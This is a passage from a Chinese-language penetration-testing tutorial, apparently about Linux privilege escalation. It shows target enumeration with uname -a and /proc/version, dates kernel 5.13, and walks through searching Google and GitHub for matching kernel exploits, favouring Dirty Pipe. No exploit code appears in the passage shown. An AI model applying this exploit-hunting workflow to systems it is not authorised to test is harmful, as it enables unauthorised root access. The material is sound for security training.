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" width="270" height="47" class="img_ev3q"></p>
<p>但是，我们想从目标收集更多信息，因此我们可以再次使用 uname 命令，但这次使用 -a 开关，它将为我们提供 Linux 风格、内核版本和架构。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">uname -a</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353441-1224976656-8c1d8835be73f344c17fd1dd226ddfd6.png" width="917" height="50" class="img_ev3q"></p>
<p>同样的，我们还可以从位于/proc/version的文件中获取此信息。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /proc/version</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155352872-863960626-2a62c0eabf821f31df57938d9279e0a6.png" width="1017" height="60" class="img_ev3q"></p>
<p>输出显示该内核相当新，因为它运行的是 5.13 版本。我们可以通过在 <a href="https://en.wikipedia.org/wiki/Linux_kernel_version_history" target="_blank" rel="noopener noreferrer">Wikipedia</a> 页面上查找内核版本来确认内核的发布日期。</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="653" height="59" class="img_ev3q"></p>
<p>这告诉我们该内核于 2021 年 6 月 27 日发布，因此我们需要找到该内核版本被发布后披露的漏洞。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="22手动查找内核漏洞"><strong><div id="id2.2">2.2、手动查找内核漏洞</div></strong><a href="#22手动查找内核漏洞" class="hash-link" aria-label="22手动查找内核漏洞的直接链接" title="22手动查找内核漏洞的直接链接">​</a></h4>
<p>现在我们已经确定内核版本为<strong>5.13</strong>，我们可以通过几种方法来搜索合适的漏洞利用。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="221通过-google-查找内核漏洞"><strong><div id="id2.2.1">2.2.1、通过 Google 查找内核漏洞</div></strong><a href="#221通过-google-查找内核漏洞" class="hash-link" aria-label="221通过-google-查找内核漏洞的直接链接" title="221通过-google-查找内核漏洞的直接链接">​</a></h6>
<p>搜索内核漏洞的第一种方法是获取我们枚举的内核版本信息，然后在 Google 上搜索该内核版本容易受到攻击的任何漏洞。</p>
<blockquote>
<p>作为一名黑客，Google 技能非常重要，只要有机会就磨练它们！</p>
</blockquote>
<p>我们从广泛搜索开始：<strong>Linux kernel 5.13 exploit</strong></p>
<p>第一个结果通常来自 CVE-Details、Vulnmon 等，这有助于概述我们可以使用的潜在漏洞；然而，向下滚动我们开始看到一些我们更感兴趣的页面。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353226-606035487-73ca8bada153deed3147debd12da4a23.png" width="642" height="389" class="img_ev3q"></p>
<p>这两个漏洞利用看起来很有希望，因为它们都提到了内核版本 5.13。此外，它们也都提到了 Ubuntu，我们知道这是我们的目标正在运行的 Linux 版本。</p>
<p>我们可以阅读 Dirty Pipe 上的这些博客文章，以便更好地了解该漏洞是什么；但是，我们可以看到，最热门的漏洞托管在 GitHub 上，我们很可能在那里找到托管的任何内核版本的大多数内核漏洞，因此让我们稍微编辑一下搜索以包括 github，如： <strong>Linux kernel 5.13 exploit github</strong></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353998-59473058-5bf0f4ce0cee8664a8623b6a161e4a71.png" width="861" height="788" class="img_ev3q"></p>
<p>在这里我们可以看到，当将github关键字添加到搜索条件中时，这两个漏洞都是最热门的结果，并且是第三个要测试的潜在漏洞！现在让我们看看它们的作用。</p>
<p>在阅读了这三个exploit之后，第三个漏洞 &quot;Dirty Pipe &quot;无疑是最有希望的，因为它影响的内核范围比其他漏洞更大。</p>
<p>现在我们可以通过几种方法来做到这一点。由于我们喜欢 Dirty Pipe 的方式，因此我们可以尝试我们找到的那个，或者，我们可以进行新的 Google 搜索以找到更多要测试的exploit。例如：<strong>Dirty Pipe github</strong></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353226-1539747468-402f97e7978b8a976188cbe048680a5f.png" width="842" height="678" class="img_ev3q"></p>
<p>我们马上可以看到前 4 个结果都是我们可以测试的 Dirty Pipe 的不同“版本”（相同的漏洞但是是来自不同的作者或使用不同的技术而实现的利用代码）。</p>
